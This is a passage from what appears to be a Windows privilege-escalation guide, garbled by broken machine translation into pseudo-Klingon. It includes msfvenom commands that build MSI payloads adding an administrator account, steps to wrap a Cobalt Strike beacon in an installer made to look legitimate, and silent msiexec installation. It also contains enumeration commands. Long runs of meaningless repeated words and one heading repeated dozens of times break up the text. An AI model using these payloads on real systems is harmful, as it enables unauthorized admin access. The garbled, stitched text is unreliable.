hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjatning hujjat
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads

#### Introduction

Metasploit is a powerful framework that provides a wide range of tools and techniques for penetration testing and exploiting vulnerabilities. One of the key features of Metasploit is its ability to generate and deliver payloads, which are essentially pieces of code that can be executed on a target system to gain unauthorized access or perform other malicious activities.

#### Types of payloads

Metasploit offers various types of payloads, each designed to achieve different objectives. Some of the commonly used payload types include:

- **Reverse TCP**: This payload establishes a reverse TCP connection between the attacker and the target system, allowing the attacker to gain remote access to the system.

- **Bind TCP**: This payload listens for incoming TCP connections on a specified port, enabling the attacker to connect to the target system.

- **Meterpreter**: Meterpreter is a powerful payload that provides an interactive shell on the target system, allowing the attacker to execute commands, upload and download files, and perform various post-exploitation activities.

- **Shell**: This payload provides a basic command shell on the target system, allowing the attacker to execute commands and interact with the system.

- **VNC**: This payload enables the attacker to gain graphical remote access to the target system using the Virtual Network Computing (VNC) protocol.

#### Generating and delivering payloads

Metasploit provides a number of options for generating and delivering payloads. The `msfvenom` tool, which is part of the Metasploit framework, allows you to generate payloads in various formats, such as executable files, shellcode, and encoded payloads.

Once you have generated a payload, you can deliver it to the target system using various methods, such as social engineering techniques, exploiting vulnerabilities in software or services running on the target system, or by using client-side attacks.

#### Conclusion

Metasploit payloads are a crucial component of the framework, enabling attackers to gain unauthorized access to target systems and perform various malicious activities. Understanding the different types of payloads and how to generate and deliver them is essential for effective penetration testing and exploitation.
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
**ghItlh** meterpreter **session** vItlhutlh. **module** **`exploit/windows/local/always_install_elevated`** **ghItlh** **automate** **technique** **vaj**.

### PowerUP

**Write-UserAddMSI** **command** **ghItlh** power-up **vIlegh** **Windows MSI binary** **vItlhutlh** **privileges** **ghItlh** **escalate**. **This script** **writes out** **precompiled MSI installer** **vItlhutlh** **user/group addition** **prompt** (so **GIU access** **be** **need**):
```
Write-UserAddMSI
```
**Qap** the created binary to **vItlhutlh** **privileges**.

### MSI Wrapper

Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **command lines**

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### Create MSI with WIX

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Create MSI with Visual Studio

* **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
* Open **Visual Studio**, select **Create a new project** and type "installer" into the search box. Select the **Setup Wizard** project and click **Next**.
* Give the project a name, like **AlwaysPrivesc**, use **`C:\privesc`** for the location, select **place solution and project in the same directory**, and click **Create**.
* Keep clicking **Next** until you get to step 3 of 4 (choose files to include). Click **Add** and select the Beacon payload you just generated. Then click **Finish**.
* Highlight the **AlwaysPrivesc** project in the **Solution Explorer** and in the **Properties**, change **TargetPlatform** from **x86** to **x64**.
* There are other properties you can change, such as the **Author** and **Manufacturer** which can make the installed app look more legitimate.
* Right-click the project and select **View > Custom Actions**.
* Right-click **Install** and select **Add Custom Action**.
* Double-click on **Application Folder**, select your **beacon.exe** file and click **OK**. This will ensure that the beacon payload is executed as soon as the installer is run.
* Under the **Custom Action Properties**, change **Run64Bit** to **True**.
* Finally, **build it**.
* If the warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` is shown, make sure you set the platform to x64.

### MSI Installation

To **vItlhutlh** the **installation** of the malicious `.msi` file in **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
To exploit this vulnerability you can use: _exploit/windows/local/always\_install\_elevated_

## Antivirus and Detectors

### Audit Settings

These settings decide what is being **logged**, so you should pay attention

---

## tlhIngan Hol translation:

To exploit this vulnerability you can use: _exploit/windows/local/always\_install\_elevated_

## Antivirus and Detectors

### Audit Settings

These settings decide what is being **logged**, so you should pay attention
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, vItlhutlh logs jatlhqa' 'ej logmeyDaq nuq jatlhqa' 'e' vItlhutlh.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** designed for the **management of local Administrator passwords**, ensuring that each password is **unique, randomised, and regularly updated** on computers joined to a domain. These passwords securely stored within Active Directory and can only be accessed by users who have been granted sufficient permissions through ACLs, allowing them to view local admin passwords if authorized.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

If active, **plain-text passwords stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** jatlhlaHbe'chugh, Microsoft LSA (Local Security Authority) **ghItlh** **ghItlh** 'e' vItlhutlh **ghItlh** 'ej code inject, **ghItlh** **untrusted processes** **block** **enhanced protection** introduced.\
[**LSA Protection vItlhutlh** **More info about here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### qurgh Credentials

**qurgh Credentials Guard** introduced in **Windows 10**. Its purpose is to safeguard the credentials stored on a device against threats like pass-the-hash attacks.
[**More info about qurgh Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** are authenticated by the **Local Security Authority** (LSA) and utilized by operating system components. When a user's logon data is authenticated by a registered security package, domain credentials for the user are typically established.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Users & Groups

### Enumerate Users & Groups

**tlhIngan Hol:**

*ghItlhvam* vaj *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *ghItlhvam* *ghItlhvamwI'* *
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

**Qa'pla'!** QaStaHvIS **belong to some privileged group you may be able to escalate privileges**. **ghItlh** about privileged groups and how to **abuse them to escalate privileges** here:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Token manipulation

**ghItlh** **more** about what is a **token** in this page: [**Windows Tokens**](../authentication-credentials-uac-and-efs.md#access-tokens).\
**Check** the following page to **ghItlh about interesting tokens** and how to **abuse them**:

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### qo'noS qachmey

#### Introduction

The home folder, also known as the user profile folder, is a directory on a Windows system where user-specific data and settings are stored. This folder contains important files and configurations related to the user's account and applications.

#### Purpose

The home folder serves several purposes, including:

- Storing personal files: Users can save their documents, pictures, videos, and other files in their home folder for easy access.
- Customizing settings: Various application settings and preferences are stored in the home folder, allowing users to personalize their computing experience.
- Managing user-specific data: The home folder contains data specific to each user, such as browser bookmarks, email signatures, and desktop shortcuts.

#### Location

By default, the home folder is located in the `C:\Users` directory on Windows systems. Each user has a separate folder within this directory, named after their username.

#### Access Control

The home folder is protected by access control mechanisms to ensure that only the user and authorized system administrators can access its contents. By default, the user has full control over their home folder, while other users have limited or no access.

#### Privilege Escalation Opportunities

As a hacker, gaining access to a user's home folder can provide valuable information and potential privilege escalation opportunities. Some common techniques for escalating privileges through the home folder include:

- Exploiting misconfigured permissions: If the access control settings on the home folder are misconfigured, it may be possible to gain unauthorized access or modify critical files.
- Exploiting application vulnerabilities: Some applications store sensitive data, such as passwords or encryption keys, within the user's home folder. Exploiting vulnerabilities in these applications can lead to privilege escalation.
- Exploiting weakly protected credentials: If the user has stored credentials, such as SSH private keys or database passwords, within their home folder, compromising these credentials can lead to privilege escalation.

#### Conclusion

Understanding the importance of home folders and the potential privilege escalation opportunities they present is crucial for both system administrators and hackers. By properly securing home folders and regularly auditing their access control settings, system administrators can mitigate the risk of unauthorized access and privilege escalation. Conversely, hackers can exploit misconfigurations and vulnerabilities related to home folders to gain unauthorized access and escalate their privileges on a compromised system.
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### tlhIngan Hol

### nIqHom Qap

#### Password Policy

A password policy is a set of rules and requirements that dictate how passwords should be created and managed within a system. The purpose of a password policy is to enhance the security of user accounts by enforcing strong and unique passwords.

Here are some common elements that are typically included in a password policy:

1. **Password Length**: Specifies the minimum and maximum number of characters that a password must have. For example, a policy might require passwords to be at least 8 characters long and no more than 16 characters long.

2. **Password Complexity**: Requires passwords to contain a combination of different character types, such as uppercase letters, lowercase letters, numbers, and special characters. This helps to prevent easy-to-guess passwords.

3. **Password Expiration**: Sets a time limit for how long a password can be used before it must be changed. This helps to ensure that passwords are regularly updated and reduces the risk of compromised accounts.

4. **Password History**: Prevents users from reusing their previous passwords. This helps to prevent attackers from gaining access to an account by guessing a previously used password.

5. **Account Lockout**: Specifies the number of failed login attempts allowed before an account is locked. This helps to protect against brute-force attacks where an attacker tries multiple passwords until they find the correct one.

6. **Password Storage**: Defines how passwords are stored within a system. It is important to use secure methods, such as hashing and salting, to protect passwords from being easily compromised in the event of a data breach.

By implementing a strong password policy, organizations can significantly reduce the risk of unauthorized access to their systems and protect sensitive information from being compromised.
```bash
net accounts
```
### Get the content of the clipboard

#### English

To get the content of the clipboard in Windows, you can use the `Get-Clipboard` cmdlet in PowerShell. This cmdlet retrieves the text or files that are currently stored in the clipboard.

Here's an example of how to use the `Get-Clipboard` cmdlet:

```powershell
Get-Clipboard
```

This will display the content of the clipboard in the PowerShell console.

#### Klingon

Windows vItlhutlh, 'ej vItlhutlh content clipboard, 'ej 'oH 'e' vItlhutlh cmdlet PowerShell, 'e' vItlhutlh `Get-Clipboard` chu' vay':

```powershell
Get-Clipboard
```

vay' content clipboard PowerShell console.
```bash
powershell -command "Get-Clipboard"
```
## Qapmey

### QaStaHvIS je

QaStaHvIS, **QaStaHvIS process command line Daq yIlo'laH**.\
QaStaHvIS **binary running yIlo'laH** pe'vIlDaq yIlo'laH, bejegh binary folder write permissions exploit [**DLL Hijacking attacks**](dll-hijacking.md) yIlo'laH:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
**ghItlhvam electron/cef/chromium debuggers** [**running, you could abuse it to escalate privileges**](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Checking permissions of the processes binaries**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

